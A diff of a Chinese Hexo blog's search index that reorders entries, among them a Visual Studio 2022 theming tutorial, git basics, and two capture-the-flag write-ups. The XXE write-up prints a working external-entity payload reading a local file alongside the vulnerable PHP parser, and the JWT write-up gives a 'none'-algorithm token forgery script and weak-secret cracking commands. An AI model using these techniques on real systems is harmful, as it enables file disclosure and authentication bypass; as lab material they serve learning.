-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">flag</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span>&lt;!--构造实体--&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;flag;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="comment">&lt;!--输出flag实体--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">password</span>&gt;</span>2333<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>flag{6866a844-3788-4a9d-9909-1d9d9943f56f}</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/cd6a7f863a0647bb892ae50de7f3e0f9.png" alt="在这里插入图片描述"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/13c964cfa670469aa893c588d287e821.png" alt="在这里插入图片描述"></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* autor: c0ny1</span></span><br><span class="line"><span class="comment">* date: 2018-2-7</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$USERNAME</span> = <span class="string">&#x27;admin&#x27;</span>; <span class="comment">//账号</span></span><br><span class="line"><span class="variable">$PASSWORD</span> = <span class="string">&#x27;024b87931a03f738fff6693ce0a78c88&#x27;</span>; <span class="comment">//密码</span></span><br><span class="line"><span class="variable">$result</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">	<span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">	<span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">	<span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line"></span><br><span class="line">	<span class="variable">$username</span> = <span class="variable">$creds</span>-&gt;username;</span><br><span class="line">	<span class="variable">$password</span> = <span class="variable">$creds</span>-&gt;password;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$username</span> == <span class="variable">$USERNAME</span> &amp;&amp; <span class="variable">$password</span> == <span class="variable">$PASSWORD</span>)&#123;</span><br><span class="line">		<span class="variable">$result</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">1</span>,<span class="variable">$username</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$result</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">0</span>,<span class="variable">$username</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;</span><br><span class="line">	<span class="variable">$result</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">3</span>,<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>有 admin 密码了也没用<br>藏内网了，上次比赛 ssrf 题出过</p>
-<ul>
-<li>etc&#x2F;hosts</li>
-<li>proc&#x2F;net&#x2F;arp<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/a3a597abcb6b4158bcce5dcbb89afe09.png" alt="在这里插入图片描述"></li>
-</ul>
+    <title>Visual Studio 2022界面美化教程</title>
+    <url>/2021/12/Visual%20Studio%202022%E7%95%8C%E9%9D%A2%E7%BE%8E%E5%8C%96%E6%95%99%E7%A8%8B/</url>
+    <content><![CDATA[<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254207258-133.png" alt="点击并拖拽以移动"></p>
+<p>我之前用的是 2019 版本，后来有出新版我也没管，直到前几天他给我推送 2022 版了，查了下大部分都是好评（bug 恐惧症和恋旧），于是我决定入 2022 版了，但又怕我在 2019 调好的设置用不到 2022 上，于是暂时让两个版本共存，等 2022 调试好了再说 2019 的事。</p>
+<p>这是我在 2019 上美化用到的插件和设置（因为网上类似的不少，但 2022 版貌似没有人发过，所以我决定写这篇文章）</p>
+<p>不出所料，2022 版好多东西更新，导致一些东西不能用了，导入 2019 版甚至文件的时候，有一部分报错了，要不然就是改名了，要不然就是更新换代了，没大有影响，以萌新目前来看，是往好的方向发展了。</p>
+<p>但是我的那些美化插件直接搜名字的话是找不到了，于是我就在那找替代品，就找到了这两个插件。</p>
+<p>第一个插件，是 2019 版变的，变了样之后差点给我整不会了，它是类似于编程。</p>
+<p>新建项目 C#里面最后一项</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254210315-136.png" alt="点击并拖拽以移动"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254212027-139.png" alt="da3a0ac9713d4b289c4351ca0ac8835d.png"></p>
+<p>创建之后，把 2019 版的该插件里的美化设置导出，然后重命名为 CustomTheme.vstheme</p>
+<p>然后复制到你新创建的 2022 版那个项目里，选择替换更新，之后项目文件夹里.sln 后缀的那个文件打开，选择你之前那个配置的名字，然后运行，不管他蹦出来啥弹窗，等他一打开接着关了就好，之后重启 visualstudio 就可以了</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254213778-142.png" alt="点击并拖拽以移动"></p>
+<p>这个插件是为后面设置背景图片准备</p>
+<p>第二个插件我原来用的是 moeIDE，但是 2022 版它不支持了，所以就用新插件代替了。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254216001-145.png" alt="点击并拖拽以移动"></p>
+<p>背景图是 B 站 1024 节发布的一张壁纸，我用 ps 调了下对比度，让他更鲜艳一些</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254218564-148.png" alt="点击并拖拽以移动"></p>
 ]]></content>
       <categories>
-        <category>web</category>
+        <category>教程</category>
       </categories>
       <tags>
-        <tag>web</tag>
-        <tag>xxe</tag>
-        <tag>buuctf</tag>
+        <tag>visual studio 2022</tag>
       </tags>
   </entry>
   <entry>
@@ -465,6 +434,37 @@
         <tag>awd</tag>
         <tag>长城杯</tag>
         <tag>铁人三项</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>xxe</title>
+    <url>/2022/12/XXE/</url>
+    <content><![CDATA[<h3 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h3><p>发现输入的 username 被 alert 了<br>查源码</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">onclick = <span class="string">&quot;XMLFunction()&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254264857-190.png" alt="在这里插入图片描述">抓包看 xml 格式<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254267429-193.png" alt="在这里插入图片描述">回来看控制台<br>发现 js 的 xml 应用</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">XMLFunction</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> xml = <span class="string">&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27;&lt;root&gt;&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27; &lt;username&gt;&#x27;</span> + $(<span class="string">&#x27;#username&#x27;</span>).<span class="title function_">val</span>() + <span class="string">&#x27;&lt;/username&gt;&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27; &lt;password&gt;&#x27;</span> + $(<span class="string">&#x27;#password&#x27;</span>).<span class="title function_">val</span>() + <span class="string">&#x27;&lt;/password&gt;&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27; &lt;/root&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">var</span> xmlhttp = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">            xmlhttp.<span class="property">onreadystatechange</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(xmlhttp.<span class="property">readyState</span> == <span class="number">4</span>)&#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(xmlhttp.<span class="property">readyState</span>);</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(xmlhttp.<span class="property">responseText</span>);</span><br><span class="line">                    <span class="title function_">alert</span>(xmlhttp.<span class="property">responseText</span>);</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            xmlhttp.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>,<span class="string">&quot;login.php&quot;</span>,<span class="literal">true</span>);</span><br><span class="line">            xmlhttp.<span class="title function_">send</span>(xml);</span><br><span class="line">        &#125;;</span><br><span class="line">    &lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>构造 xxe 攻击<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254269819-196.png" alt="在这里插入图片描述">这是 post 包<code>传的时候记得把注释删去</code></p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">flag</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span>&lt;!--构造实体--&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;flag;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="comment">&lt;!--输出flag实体--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">password</span>&gt;</span>2333<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>flag{6866a844-3788-4a9d-9909-1d9d9943f56f}</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/cd6a7f863a0647bb892ae50de7f3e0f9.png" alt="在这里插入图片描述"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/13c964cfa670469aa893c588d287e821.png" alt="在这里插入图片描述"></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* autor: c0ny1</span></span><br><span class="line"><span class="comment">* date: 2018-2-7</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$USERNAME</span> = <span class="string">&#x27;admin&#x27;</span>; <span class="comment">//账号</span></span><br><span class="line"><span class="variable">$PASSWORD</span> = <span class="string">&#x27;024b87931a03f738fff6693ce0a78c88&#x27;</span>; <span class="comment">//密码</span></span><br><span class="line"><span class="variable">$result</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">	<span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">	<span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">	<span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line"></span><br><span class="line">	<span class="variable">$username</span> = <span class="variable">$creds</span>-&gt;username;</span><br><span class="line">	<span class="variable">$password</span> = <span class="variable">$creds</span>-&gt;password;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$username</span> == <span class="variable">$USERNAME</span> &amp;&amp; <span class="variable">$password</span> == <span class="variable">$PASSWORD</span>)&#123;</span><br><span class="line">		<span class="variable">$result</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">1</span>,<span class="variable">$username</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$result</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">0</span>,<span class="variable">$username</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;</span><br><span class="line">	<span class="variable">$result</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">3</span>,<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>有 admin 密码了也没用<br>藏内网了，上次比赛 ssrf 题出过</p>
+<ul>
+<li>etc&#x2F;hosts</li>
+<li>proc&#x2F;net&#x2F;arp<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/a3a597abcb6b4158bcce5dcbb89afe09.png" alt="在这里插入图片描述"></li>
+</ul>
+]]></content>
+      <categories>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>xxe</tag>
+        <tag>buuctf</tag>
       </tags>
   </entry>
   <entry>
@@ -655,44 +655,6 @@
       </tags>
   </entry>
   <entry>
-    <title>git命令</title>
-    <url>/2022/02/git/</url>
-    <content><![CDATA[<h2 id="创建仓库命令"><a href="#创建仓库命令" class="headerlink" title="创建仓库命令"></a>创建仓库命令</h2><h3 id="init"><a href="#init" class="headerlink" title="init"></a>init</h3><p>git init 命令用于在目录中创建新的 Git 仓库。<br>在文件夹中，会被创建出一个.git 的一个隐藏文件，这时，本地库已经初始化完成.</p>
-<h3 id="clone"><a href="#clone" class="headerlink" title="clone"></a>clone</h3><p>git clone 拷贝一个 Git 仓库到本地，让自己能够查看该项目，或者进行修改。<br>拷贝项目命令格式如下：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone [url]</span><br></pre></td></tr></table></figure>
-
-<h2 id="提交与修改"><a href="#提交与修改" class="headerlink" title="提交与修改"></a>提交与修改</h2><h3 id="add"><a href="#add" class="headerlink" title="add"></a>add</h3><p>git add 命令可将该文件添加到暂存区。</p>
-<p>添加一个或多个文件到暂存区</p>
-<h3 id="commit"><a href="#commit" class="headerlink" title="commit"></a>commit</h3><p>git commit 命令将暂存区内容添加到本地仓库中。<br>提交暂存区到本地仓库中:</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git commit -m [message]</span><br></pre></td></tr></table></figure>
-
-<p>[message] 可以是一些备注信息。</p>
-<h3 id="status"><a href="#status" class="headerlink" title="status"></a>status</h3><p>git status 命令用于查看在你上次提交之后是否有对文件进行再次修改。</p>
-<h3 id="rm"><a href="#rm" class="headerlink" title="rm"></a>rm</h3><p>git rm 命令用于删除文件。<br>如果只是简单地从工作目录中手工删除文件，运行 git status 时就会在 Changes not staged for commit 的提示。</p>
-<h3 id="mv"><a href="#mv" class="headerlink" title="mv"></a>mv</h3><p>git mv 命令用于移动或重命名一个文件、目录或软连接。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git mv [file] [newfile]</span><br></pre></td></tr></table></figure>
-
-<p>如果新文件名已经存在，但还是要重命名它，可以使用 -f 参数：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git mv -f [file] [newfile]</span><br></pre></td></tr></table></figure>
-
-<h2 id="远程操作"><a href="#远程操作" class="headerlink" title="远程操作"></a>远程操作</h2><h3 id="remote"><a href="#remote" class="headerlink" title="remote"></a>remote</h3><p>显示所有远程仓库：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git remote -v</span><br></pre></td></tr></table></figure>
-
-<h3 id="pull"><a href="#pull" class="headerlink" title="pull"></a>pull</h3><p>git pull 命令用于从远程获取代码并合并本地的版本。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git pull &lt;远程主机名&gt; &lt;远程分支名&gt;:&lt;本地分支名&gt;</span><br></pre></td></tr></table></figure>
-
-<h3 id="push"><a href="#push" class="headerlink" title="push"></a>push</h3><p>git push 命用于从将本地的分支版本上传到远程并合并。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git push &lt;远程主机名&gt; &lt;本地分支名&gt;:&lt;远程分支名&gt;</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>web</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>git</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>htb-Cat</title>
     <url>/2025/02/htb-Cat/</url>
     <content><![CDATA[<h2 id="Cat"><a href="#Cat" class="headerlink" title="Cat"></a>Cat</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p><code>nmap -A -sS -Pn 10.10.11.53</code></p>
@@ -770,6 +732,104 @@
       </tags>
   </entry>
   <entry>
+    <title>git命令</title>
+    <url>/2022/02/git/</url>
+    <content><![CDATA[<h2 id="创建仓库命令"><a href="#创建仓库命令" class="headerlink" title="创建仓库命令"></a>创建仓库命令</h2><h3 id="init"><a href="#init" class="headerlink" title="init"></a>init</h3><p>git init 命令用于在目录中创建新的 Git 仓库。<br>在文件夹中，会被创建出一个.git 的一个隐藏文件，这时，本地库已经初始化完成.</p>
+<h3 id="clone"><a href="#clone" class="headerlink" title="clone"></a>clone</h3><p>git clone 拷贝一个 Git 仓库到本地，让自己能够查看该项目，或者进行修改。<br>拷贝项目命令格式如下：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone [url]</span><br></pre></td></tr></table></figure>
+
+<h2 id="提交与修改"><a href="#提交与修改" class="headerlink" title="提交与修改"></a>提交与修改</h2><h3 id="add"><a href="#add" class="headerlink" title="add"></a>add</h3><p>git add 命令可将该文件添加到暂存区。</p>
+<p>添加一个或多个文件到暂存区</p>
+<h3 id="commit"><a href="#commit" class="headerlink" title="commit"></a>commit</h3><p>git commit 命令将暂存区内容添加到本地仓库中。<br>提交暂存区到本地仓库中:</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git commit -m [message]</span><br></pre></td></tr></table></figure>
+
+<p>[message] 可以是一些备注信息。</p>
+<h3 id="status"><a href="#status" class="headerlink" title="status"></a>status</h3><p>git status 命令用于查看在你上次提交之后是否有对文件进行再次修改。</p>
+<h3 id="rm"><a href="#rm" class="headerlink" title="rm"></a>rm</h3><p>git rm 命令用于删除文件。<br>如果只是简单地从工作目录中手工删除文件，运行 git status 时就会在 Changes not staged for commit 的提示。</p>
+<h3 id="mv"><a href="#mv" class="headerlink" title="mv"></a>mv</h3><p>git mv 命令用于移动或重命名一个文件、目录或软连接。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git mv [file] [newfile]</span><br></pre></td></tr></table></figure>
+
+<p>如果新文件名已经存在，但还是要重命名它，可以使用 -f 参数：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git mv -f [file] [newfile]</span><br></pre></td></tr></table></figure>
+
+<h2 id="远程操作"><a href="#远程操作" class="headerlink" title="远程操作"></a>远程操作</h2><h3 id="remote"><a href="#remote" class="headerlink" title="remote"></a>remote</h3><p>显示所有远程仓库：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git remote -v</span><br></pre></td></tr></table></figure>
+
+<h3 id="pull"><a href="#pull" class="headerlink" title="pull"></a>pull</h3><p>git pull 命令用于从远程获取代码并合并本地的版本。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git pull &lt;远程主机名&gt; &lt;远程分支名&gt;:&lt;本地分支名&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="push"><a href="#push" class="headerlink" title="push"></a>push</h3><p>git push 命用于从将本地的分支版本上传到远程并合并。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git push &lt;远程主机名&gt; &lt;本地分支名&gt;:&lt;远程分支名&gt;</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>git</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ctfhub-jwt</title>
+    <url>/2022/09/jwt/</url>
+    <content><![CDATA[<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>题目附件：<a href="https://www.wolai.com/ctfhub/hcFRbVUSwDUD1UTrPJbkob">jwt 基础知识</a></p>
+<p>flag 在下面</p>
+<p>需要了解一下 jwt 组成部分</p>
+<h2 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h2><p>随便输个</p>
+<p>进去查消息头</p>
+<p>然后在</p>
+<p><a href="https://jwt.io/">jwt.io</a></p>
+<p>decode 一共两部分 ag 是另一半<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254077114-40.png" alt="请添加图片描述"></p>
+<h2 id="无签名"><a href="#无签名" class="headerlink" title="无签名"></a>无签名</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line">algorithm=<span class="string">&quot;none&quot;</span></span><br><span class="line">payload = &#123;</span><br><span class="line">  <span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">  <span class="string">&quot;password&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">  <span class="string">&quot;role&quot;</span>:<span class="string">&quot;admin&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">key = <span class="string">&quot;&quot;</span></span><br><span class="line">encoded = jwt.encode(payload,key,algorithm)</span><br><span class="line"><span class="built_in">print</span>(encoded)</span><br></pre></td></tr></table></figure>
+
+<p>jwt 的签名可以为无</p>
+<blockquote>
+<p>今天写这个脚本的时候命名为 jwt.py</p>
+<p>结果报错 但是系统环境运行正常</p>
+<p>才知道是文件名的事</p>
+<p>import jwt 他先自己引用自己了</p>
+</blockquote>
+<p>抓包</p>
+<p>把 cookie 里的 token 改为这脚本的运行结果</p>
+<h2 id="弱密钥"><a href="#弱密钥" class="headerlink" title="弱密钥"></a>弱密钥</h2><p>需要用到<a href="https://github.com/brendan-rius/c-jwt-cracker">jwt-cracker</a></p>
+<p>依次执行即可</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/brendan-rius/c-jwt-cracker</span><br><span class="line">./c-jwt-cracker</span><br><span class="line">make</span><br><span class="line">./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IjEiLCJwYXNzd29yZCI6IjEiLCJyb2xlIjoiZ3Vlc3QifQ.w4i8KWRWmY_xTYtRnFZnp5vLIxPG2abCly6lW6QxTKs</span><br></pre></td></tr></table></figure>
+
+<p>然后得出该 jwt 密钥</p>
+<p>然后放之前那个网站</p>
+<p>改 role 为 admin</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254081515-43.png" alt="请添加图片描述"></p>
